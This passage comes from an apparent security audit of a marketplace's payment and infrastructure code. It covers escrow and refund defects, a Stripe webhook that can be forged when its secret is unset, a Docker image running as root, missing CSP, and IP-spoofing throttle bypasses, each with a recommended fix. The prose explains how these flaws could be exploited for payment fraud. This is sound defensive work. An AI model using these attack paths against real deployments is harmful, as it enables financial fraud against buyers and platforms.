**Recommended fix.** In `stripe.provider.parseWebhook`, expand the session (or read `data.object.payment_intent`) and persist the real `pi_…`/`ch_…` to a dedicated `Order.stripePaymentIntentId`. Refund against that. Keep `client_reference_id` only for order lookup/idempotency, not as the refund target.

**Files:** `apps/api/src/payments/providers/stripe.provider.ts:140-174, 218-226`, `apps/api/src/payments/payments.service.ts:383-401`.

---

### PAY-004 (High) — Escrow auto-releases on `PAID`/`IN_PROGRESS` orders the seller never marked delivered

**What.** The hourly sweep releases any held order past its 3-day timer whose status is in `['DELIVERED','PAID','IN_PROGRESS']`:

```ts
// orders.service.ts:699-710
where: {
  escrowStatus: 'HELD',
  autoReleaseAt: { lt: new Date() },
  status: { in: ['DELIVERED', 'PAID', 'IN_PROGRESS'] },
  disputes: { none: { status: { in: ['OPEN','REVIEWING','AWAITING_RESPONSE','ESCALATED'] } } },
}
```

`autoReleaseAt` is set to `now + 3 days` at payment time (`payments.service.ts:357-359`), *independent of delivery*.

**Why it's wrong.** A seller who is paid but **never marks the order delivered** (status stays `PAID`) still has escrow auto-released to them after 3 days, provided the buyer didn't open a dispute. The auto-release is meant to protect sellers from buyers who forget to confirm *delivered* goods — but here it also pays sellers who never delivered anything.

**Impact.** Non-delivery fraud: a seller lists, gets paid, sits silent for 3 days, and collects funds with zero proof of delivery. The buyer's only defense is to notice and open a dispute within the window — a weak, race-dependent control for a real-money escrow. Combined with PAY-002/003 (refunds broken), the buyer may have no working remedy.

**Recommended fix.** Only auto-release `DELIVERED` orders (seller has submitted delivery proof). For `PAID`/`IN_PROGRESS` orders past a longer SLA, route to a manual/abandoned-order review or auto-refund the buyer, not auto-pay the seller. At minimum, require `deliveredAt != null` before auto-release.

**Files:** `apps/api/src/orders/orders.service.ts:696-722`, `apps/api/src/payments/payments.service.ts:357-359`.

---

### PAY-005 (High) — Dispute resolution moves internal ledgers but never issues the actual buyer refund

**What.** `resolveDispute` with `REFUND_BUYER`/`PARTIAL_REFUND` sets the order `REFUNDED`, claws back the seller wallet if escrow was released, and notifies the buyer — but **never calls `this.payments.processRefund`** (`admin-order.service.ts:296-338`). Contrast with `refundOrder`, which at least attempts a provider call.

**Why it's wrong.** Escrow funds for a still-HELD order are buyer money sitting at the PSP/platform; resolving "refund buyer" must trigger a real refund to the buyer's card or a wallet credit. Here the order is flipped to `REFUNDED` with no money movement to the buyer at all (no provider refund, no `buyerWallet` credit for the escrowed principal).

**Impact.** Buyer wins a dispute, sees "Dispute resolved", but receives nothing. The platform retains the escrowed funds. Direct financial harm + compliance/chargeback risk.

**Recommended fix.** In `resolveDispute`, for buyer-favoring resolutions call `processRefund({ transactionId: <stripe pi>, amount, currency, reason })` (post PAY-002/003 fix) when escrow is still HELD, or credit the buyer wallet for the principal, mirroring `refundOrder`. Add an integration test asserting buyer funds actually move.

**Files:** `apps/api/src/admin/services/admin-order.service.ts:280-338`.

---

## 3. Medium findings

### PAY-006 (Medium) — Cashback credited outside any DB transaction (`this.prisma` passed where a tx client is expected)

`OrderWalletListener.handleOrderReleased` calls `wallet.creditCashback(this.prisma, …)` (`order-wallet.listener.ts:26`), passing the singleton client, not a `$transaction`. `creditCashback` performs *three* dependent writes (increment wallet, re-read balance, insert ledger row) as separate auto-committed statements (`wallet.service.ts:263-289`). A crash between the increment and the ledger insert leaves a wallet credited with no matching `WalletTransaction` row → silent ledger drift. There is no idempotency key, so a duplicate event delivery (the listener is async and not guarded by `WebhookEvent`) double-credits cashback. **Impact:** ledger inconsistency + possible duplicate cashback. **Fix:** wrap the three writes in `this.prisma.$transaction`, and gate on a per-order idempotency marker (e.g. `WalletTransaction.idempotencyKey = 'cashback:'+orderId`, which the schema already supports at `schema.prisma:1101` but is unused everywhere).

### PAY-007 (Medium) — `WalletTransaction.idempotencyKey` is defined-but-never-set; release/withdraw/refund ledger writes have no dedup key

`grep` shows `idempotencyKey` is set on **zero** `walletTransaction.create` calls in the codebase. Double-credit safety today rests entirely on (a) the `WebhookEvent` unique row and (b) the `escrowStatus:HELD` atomic claim. Those cover the primary paths, but any future second trigger (or the async cashback in PAY-006) has no last-line-of-defense unique constraint. **Fix:** populate `idempotencyKey` with a deterministic value per money event (`release:<orderId>`, `withdraw:<withdrawalId>`, `cashback:<orderId>`) so the DB rejects duplicates regardless of upstream guards.

### PAY-008 (Medium) — `processPaymentFailed` refunds wallet credit but not redeemed-loyalty USD principal symmetry; partial-refund clawback may under/over-debit

In `processRefundCompleted`, the seller clawback only fires for `isFullRefund && escrowStatus==='RELEASED'` (`payments.service.ts:663-699`); a **partial** Stripe refund on an already-released order performs no proportional seller clawback — the platform silently absorbs the full partial amount while the seller keeps 100%. For marketplaces this is usually intended (platform eats fraud loss), but it is undocumented and asymmetric vs. the admin `resolveDispute` path which *does* clamp `Math.min(refundAmt, sellerAmount)`. **Fix:** make partial-refund seller treatment explicit and consistent across the webhook path and the admin path.

### PAY-009 (Medium) — Legacy `/payments/webhook` enabled by env flag bypasses per-provider fail-closed routing

`handleWebhook` (`payments.service.ts:168-201`) loops providers and accepts the first that parses. It is blocked in prod by `NODE_ENV` *and* by `PAYMENTS_ALLOW_LEGACY_WEBHOOK!=='true'` (`payments.controller.ts:85-87`). That is two gates, good — but if an operator ever sets `PAYMENTS_ALLOW_LEGACY_WEBHOOK=true` in a non-prod-flagged environment (e.g. staging without `NODE_ENV=production`), the mock provider's `parseWebhook` accepts *any* JSON, and `simulateMockPayment`'s caller check does not apply here — `dispatchEvent` would process a forged `checkout.completed`. **Fix:** remove the legacy endpoint entirely, or require the same per-provider secret check inside the loop (it already calls `providerHasSecret`, but `mock` returns true whenever `NODE_ENV!=='production'`).

### PAY-010 (Medium) — Admin refund max-amount check has no lower-bound coupling to already-applied credits / prior partial refunds

`refundOrder` validates `dto.amount > buyerTotal` (`admin-order.service.ts:186-189`) but does not subtract any prior `refundAmount` already issued, nor floor at the cash-charged portion. Repeated partial refunds could cumulatively exceed what the buyer actually paid by card (wallet/loyalty portions were never card charges). **Fix:** cap refundable to `buyerTotal − walletApplied − loyaltyUsdApplied − alreadyRefunded`, and track cumulative refunded amount.

---

## 4. Low / informational

### PAY-011 (Low) — Sequential dispute number under race can collide
`openDispute` derives `DSP-YYYY-<count+1>` from `dispute.count()` (`orders.service.ts:606-607`) outside the create transaction. Two concurrent disputes can mint the same number. Order/withdrawal numbers correctly moved to `randomBytes` (PAY-HIGH-016); disputes did not. **Fix:** use the same random-suffix scheme.

### PAY-012 (Low) — Mock-checkout `amount` query param is attacker-controllable but not trusted for settlement
`mock-checkout/:sessionId?amount=` (`payments.controller.ts:98-140`) renders an attacker-supplied amount, but `mock-pay`→`simulateMockPayment` re-derives the real amount from `order.buyerTotal` (`payments.service.ts:766-773`) and enforces `order.buyerId===callerId`. So tampering the display amount has no settlement effect. Dev-only and gated by `PAYMENTS_ENABLE_MOCK==='true'` + `NODE_ENV!=='production'`. **Info only** — acknowledged as correctly bounded.

### PAY-013 (Info) — Throttler uses in-memory store; webhook & checkout limits are per-replica
Rate limits on `checkout` (10/min) and `withdraw` (3/min) are enforced per process, not cluster-wide (noted in infra map). On horizontal scale, effective limits multiply by replica count. Not a money-integrity bug, but weakens the spam/cost-amplification protections (PAY-MED-034). **Fix:** wire the existing `redis.factory` into a Redis throttler store before scaling out.

### PAY-014 (Info — needs runtime test) — Confirm rawBody capture end-to-end
PAY-001 is a static finding; confirm at runtime. **Exact test:** with `STRIPE_WEBHOOK_SECRET` configured, generate a signed event via Stripe CLI (`stripe trigger checkout.session.completed` or `stripe listen --forward-to /api/v1/payments/webhook/stripe`) and assert the order transitions to `PAID`. Today this is expected to fail signature verification.

---

## 5. Score

**paymentSecurity: 58 / 100.** The architecture and concurrency controls are genuinely strong (would score ~85 on logic alone), but the webhook-rawBody wiring (PAY-001), mock-provider refund routing (PAY-002), wrong refund target id (PAY-003), deliver-less auto-release (PAY-004), and no-op dispute refunds (PAY-005) are real-money defects that, in production, break the happy-path payment confirmation and leave buyers refundless. These pull the score down sharply because they directly cause loss of funds or denial of legitimate settlement.


---

## 4. Infrastructure & Configuration Security
## GETX — Infrastructure & DevSecOps Security Audit

**Scope:** Secrets management, security headers (helmet/CSP), CORS, rate limiting, dependency posture, Docker hardening, PII-in-logs, TLS/HTTPS posture, error verbosity. Read-only audit. Repo root `d:\GetX_`.

**Overall:** The infra/config layer is well above typical startup quality. Boot-time fail-fast for required secrets, secret-strength enforcement, fail-closed CORS allowlist, per-route throttling on every sensitive endpoint, a strict CSP on the buyer app, and a sanitised catch-all error filter are all correctly implemented. The findings below are mostly gaps in *consistency* (CSP missing on admin/seller, no shared throttler store, no CI gate) plus two configuration-dependent weaknesses that become serious if the operator mis-provisions (`STRIPE_WEBHOOK_SECRET` not boot-enforced; container runs as root).

---

### What is implemented correctly (acknowledged controls)

| Control | Evidence |
|---|---|
| Boot fail-fast on missing prod secrets | `apps/api/src/main.ts:28-43` — `DATABASE_URL/JWT_*/PII_ENCRYPTION_KEY/WEB_URL/SELLER_URL/ADMIN_URL` |
| Secret-strength enforcement | `main.ts:46-59` — JWT ≥32 chars, PII key `^[0-9a-f]{64}$`, else `process.exit(1)` |
| No hardcoded secrets | grep across `apps/` returns only `.env.*.example` placeholders (`REPLACE_WITH_*`) |
| `.env` gitignored, examples kept | `.gitignore:12-15`; `git ls-files` shows only `*.env.example` / `*.env.production.example` tracked |
| Helmet with 2yr HSTS + preload, no-referrer | `main.ts:74-81`; `x-powered-by` disabled `main.ts:82` |
| Fail-closed CORS allowlist, no wildcard, no origin reflection | `main.ts:122-140` — explicit env-sourced list + `credentials:true` |
| CSRF defence for sameSite=lax cookies | `main.ts:102-115` — 415 on non-`application/json` state-changing requests |
| Body-size caps | `main.ts:87-97` — 100kb default, 1mb webhooks only |
| Strict CSP on buyer app | `apps/web/next.config.mjs:60-83` — `frame-ancestors 'none'`, `object-src 'none'`, no `unsafe-eval`, locked `connect-src` |
| Sanitised errors, no stack/PII to client, no body logging | `apps/api/src/common/all-exceptions.filter.ts:41-75` |
| Per-route throttling on all sensitive endpoints incl. `/auth/refresh` | `auth.controller.ts:45,54,63,72,85,112,121`; the previously-pending `/auth/refresh` throttle is now present (30/60s, `:85`) |
| Webhooks fail-closed in prod | Sumsub refuses unsigned in prod (`webhooks/sumsub.controller.ts:101`); legacy webhook 404s unless explicitly enabled (`payments.controller.ts:85`); payments refuse to boot without Stripe in prod (`payments.service.ts:53-57`) |
| Deep health gated by token | `health/health.controller.ts:50-54` |

---

### Findings

#### INFRA-001 (High) — `STRIPE_WEBHOOK_SECRET` not enforced at boot; prod webhook becomes forgeable if unset
`apps/api/src/payments/payments.service.ts:50-57` refuses to boot in prod only when `STRIPE_SECRET_KEY` is missing. `STRIPE_WEBHOOK_SECRET` is **not** checked. In `apps/api/src/payments/providers/stripe.provider.ts:183-197`, when `this.webhookSecret` is empty the handler takes the `else` branch and **accepts all webhooks without signature verification** ("skipping verification (dev only)") — but nothing prevents this state in production. The same fallback-tolerant pattern exists for Connect (`payouts/connect/webhook`, `payouts.controller.ts:45-46,95`).

**Impact:** A prod deploy with a live `sk_live_…` key but empty `STRIPE_WEBHOOK_SECRET` exposes a forgeable `/api/v1/payments/webhook/stripe`. An attacker who learns an order id can POST a fake `checkout.session.completed` to flip the order to PAID/escrow-HELD without paying (the amount/currency check at PAY-CRIT-003 only runs *after* the signature gate is bypassed). Real money / escrow release at stake.

**Fix:** In the same prod guard, also require `STRIPE_WEBHOOK_SECRET` (and, when Connect is used, `STRIPE_CONNECT_WEBHOOK_SECRET`) — `throw` at boot if a live secret key is present without a webhook secret. Alternatively, make `verifyWebhook` reject (return null / 400) whenever `NODE_ENV==='production'` and no secret is configured, instead of silently accepting.

#### INFRA-002 (High) — Docker image runs as root (no `USER` directive)
`Dockerfile` has no `USER` line; the final `prod` stage (`Dockerfile:36-52`) runs `CMD ["node","dist/main"]` as **root (uid 0)**. The final stage also copies the *entire* `/app` build tree (`COPY --from=build /app /app`, `:49`), shipping source, dev-only files, and all node_modules into the runtime image.

**Impact:** Any RCE or dependency-confusion foothold in the Node process runs as root inside the container, maximising blast radius (write to any path, easier container escape on a vulnerable runtime). Larger attack surface and image size from shipping the full tree.

**Fix:** Add a non-root user in the base/prod stage (`RUN useradd -r -u 10001 appuser` then `USER appuser`), ensure `/app` is owned/readable by it, and run the listener on a non-privileged port (4000 already is). Consider a slimmer runtime stage that copies only `dist/`, `node_modules`, the Prisma client, and `package.json`.

#### INFRA-003 (Medium) — No Content-Security-Policy on the admin and seller apps
`apps/admin/next.config.mjs:45-60` and `apps/seller/next.config.mjs:45-60` set only `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy` — **no `Content-Security-Policy`**. The buyer app (`apps/web`) has a full CSP; admin/seller (the highest-privilege surfaces — they manage users, orders, payouts, escrow) do not.

**Impact:** Admin and seller dashboards lack the strongest XSS containment layer. Any reflected/stored XSS (e.g. via a malicious listing title, dispute note, or user-controlled field rendered in the admin UI) has no `script-src`/`connect-src` restriction to limit exfiltration or constrain inline-script execution. `frame-ancestors` is also absent (only the legacy `X-Frame-Options: DENY` covers clickjacking).

**Fix:** Port the `apps/web/next.config.mjs` CSP to admin and seller (`frame-ancestors 'none'`, `object-src 'none'`, `connect-src 'self'` plus the API origin/WS, locked `script-src`). These apps are SPAs proxying the API same-origin, so `connect-src 'self'` is largely sufficient.

#### INFRA-004 (Medium) — Throttler uses default in-memory store; bypassable under horizontal scaling
`apps/api/src/app.module.ts:47-53` registers `ThrottlerModule.forRoot([{ttl:60_000, limit:60}])` with the **default in-memory store** (the in-code comment at `:48-52` acknowledges Redis is needed for multi-replica). `redis.factory.ts` already provides an ioredis singleton but it is wired only to the Socket.IO adapter, not the throttler.

**Impact:** On Railway with >1 replica (or on any rollout overlap), each replica keeps its own counters, so effective limits multiply by the replica count — weakening brute-force / OTP-spam / checkout-abuse protection on exactly the endpoints (`login`, `verify-email`, `forgot-password`, `withdraw`) that rely on tight limits. Counters also reset on every deploy.

**Fix:** Add `@nestjs/throttler-storage-redis`, pass `storage: new ThrottlerStorageRedisService(getRedisClient())` to `forRoot` when `REDIS_URL` is set. Keep the in-memory fallback for single-replica/dev.

#### INFRA-005 (Medium) — `trust proxy = 1` with no upstream IP validation enables throttle / rate-limit key spoofing
`apps/api/src/main.ts:72` sets `app.set('trust proxy', 1)`, so `req.ip` (the throttler key and the IP recorded in audit logs / lockout logic) is taken from the right-most `X-Forwarded-For` hop. This is correct for a single trusted edge (Railway). However, if the API is ever reachable directly (e.g. a Railway internal URL, a misconfigured custom domain, or a future multi-proxy setup), a client can inject `X-Forwarded-For` to rotate its apparent IP and defeat per-IP throttling and the 5-strike login lockout.

**Impact:** Conditional — only exploitable if the container is reachable without going through the trusted edge. If exploitable, per-IP throttling and IP-based lockout (`auth.service.ts`) are trivially bypassed, and audit-log IPs become attacker-controlled.

**Fix:** Confirm Railway's edge always terminates and strips client-supplied `X-Forwarded-For` (it does for the public domain). Ensure the container is not reachable on a direct/internal hostname that bypasses the proxy. Document the trust boundary. `trust proxy: 1` (single hop) is the correct conservative value — keep it; do not widen to `true`.

#### INFRA-006 (Medium) — CSP `connect-src`/host config hardcodes `getx.live` while env templates use `getx.gg`
`apps/web/next.config.mjs:75` hardcodes `connect-src 'self' wss://api.getx.live https://api.getx.live …` and image hosts mix `cdn.getx.live`, `r2.getx.live`, `cdn.getx.gg`, `r2.getx.gg` (`:24-27, :66-67`). But `apps/api/.env.production.example` and `apps/web/.env.production.example` standardise on `getx.gg` (`WEB_URL="https://getx.gg"`, `API_URL="https://api.getx.gg"`, `COOKIE_DOMAIN=".getx.gg"`). Recent commits also flip between domains ("CSP connect-src must include api.getx.live", "proxy API through Next.js rewrites"). Memory notes the product is at `getx.gg`.

**Impact:** Primarily an **availability/correctness** risk, not a direct vuln: if the API is served at `api.getx.gg`, any direct (non-proxied) XHR or the Socket.IO `wss://` connection is blocked by CSP `connect-src`, breaking realtime chat/presence. Same-origin `/api/*` proxied calls still work via `'self'`, which is why it has not fully broken. A hardcoded host in CSP also drifts silently on domain changes.

**Fix:** Derive the CSP allowlist from an env var (e.g. `NEXT_PUBLIC_API_URL` host + `wss://` variant) instead of hardcoding, and reconcile the canonical domain (`.gg` vs `.live`) across CSP, image `remotePatterns`, and all `.env.*.example` files.

#### INFRA-007 (Medium) — `bcryptjs ^2.4.3` (pure-JS, outdated) and fragmented toolchain versions
`apps/api/package.json:41` pins `bcryptjs ^2.4.3` (current major is 3.x; 2.4.3 is pure-JS and notably slower than native `bcrypt`, and 2.x has a known truncation-at-72-bytes behaviour without the explicit length guard 3.x added). Toolchain versions are inconsistent: root `package.json:25` pins `pnpm@11.0.8` but `Dockerfile:4` installs `pnpm@10.15.0`; Docker base is Node 24 while frontends pin `@types/node ^20` (`apps/web/package.json:36`) and root `engines.node >=20`. Frontends run ESLint 8 (`apps/web/package.json:39`, EOL) while the API runs ESLint 9.

**Impact:** Slower password hashing (lower achievable bcrypt cost under load → weaker offline-crack resistance), and reproducibility/security-patch drift between the pnpm that resolves the lockfile (11.0.8) and the one that builds the image (10.15.0). No direct exploit, but it weakens the supply-chain baseline.

**Fix:** Move to native `bcrypt` 5.x or `@node-rs/bcrypt`, or upgrade `bcryptjs` to 3.x and assert a max-password-length guard. Align the pnpm version in the Dockerfile with root (`corepack prepare pnpm@11.0.8`). Run `pnpm audit` / Dependabot regularly. Standardise `@types/node` and Node engine across apps.

#### INFRA-008 (Low) — No CI/CD security gate (no `.github/workflows`)
There is no `.github/workflows` directory; deploys rely entirely on Railway/Vercel build success. No automated lint, typecheck, `pnpm audit`, secret-scanning, or test gate runs before deploy. Tests are effectively absent (`test:e2e` script exists but only the Nest boilerplate spec).

**Impact:** Regressions in the security controls above (e.g. someone loosening CORS, removing a `@Throttle`, committing a secret) can ship undetected. No dependency-vuln gate.

**Fix:** Add a GitHub Actions workflow: `pnpm install --frozen-lockfile`, `turbo typecheck lint`, `pnpm audit --audit-level=high`, and a secret scanner (gitleaks/trufflehog) on PRs to `main`.

#### INFRA-009 (Low) — `/health/deep` is open when `HEALTH_TOKEN` is unset
`apps/api/src/health/health.controller.ts:51-54` only enforces the token when `HEALTH_TOKEN` is configured (`if (expected && token !== expected)`). If the operator forgets to set `HEALTH_TOKEN` in prod, `/health/deep` (process RSS/heap, uptime, DB latency/error string) is publicly reachable.

**Impact:** Minor infra-reconnaissance disclosure (memory pressure, uptime → deploy cadence, DB error text). Low value to an attacker but a needless info leak.

**Fix:** In production, require `HEALTH_TOKEN` (return 404/403 when unset) rather than failing open. Consider adding it to the `main.ts` required-env list if deep health is relied upon.

#### INFRA-010 (Low) — Waitlist controller logs raw email addresses (PII in logs)
`apps/api/src/waitlist/waitlist.controller.ts:67` logs `` `Waitlist join: ${dto.country} · ${dto.email}` `` and `:96` logs `` `${dto.game} · ${cfCountry} · ${dto.email}` `` — raw email (PII) goes to Railway/Vercel logs. Elsewhere the codebase deliberately logs `userId=` instead of email (`auth.service.ts:170,258,292`), so this is an inconsistency. Otherwise PII-in-logs hygiene is good: the exception filter excludes request bodies (`all-exceptions.filter.ts:24`), and no passwords/tokens/bank details are logged.

**Impact:** Email addresses (personal data under GDPR, which the app explicitly handles via `AccountAnonymizeCron`) persist in third-party log retention beyond the user's control.

**Fix:** Log a hash or just the country/game for waitlist analytics; drop the raw email, or mask it (`a***@domain`). Align with the `userId=`-only convention used in auth.

#### INFRA-011 (Info) — WebSocket gateway allows no-Origin connections
`apps/api/src/conversations/chat.gateway.ts:57-59` allows connections with no `Origin` header (`if (!origin) return cb(null, true)`). This is intentional (curl / server-to-server / mobile webviews) and the socket is still JWT-authenticated downstream, so it is not a direct auth bypass.

**Impact:** Negligible for security (auth still required) but it means CORS is not a defence-in-depth layer for the WS endpoint; a non-browser client can attempt connections and will be gated only by the JWT handshake + `SocketRateLimiter`.

**Test/Fix:** Confirm the JWT handshake rejects unauthenticated sockets before any room join (static read suggests it does). If native clients are not a requirement, consider rejecting no-Origin connections. Left as Info pending a runtime handshake test.

---

### TLS / HTTPS posture (summary)
TLS termination is handled by the platform edge (Railway for the API, Vercel for frontends). The app correctly assumes TLS-at-edge: `trust proxy:1` for secure-cookie/`req.ip` correctness, 2yr HSTS+preload on the API (`main.ts:77`), `upgrade-insecure-requests` in the web CSP (`next.config.mjs:82`), and `secure` cookies in prod (per auth briefing). No HTTPS is terminated in-app, which is correct for this topology. No action required beyond INFRA-006 domain reconciliation.

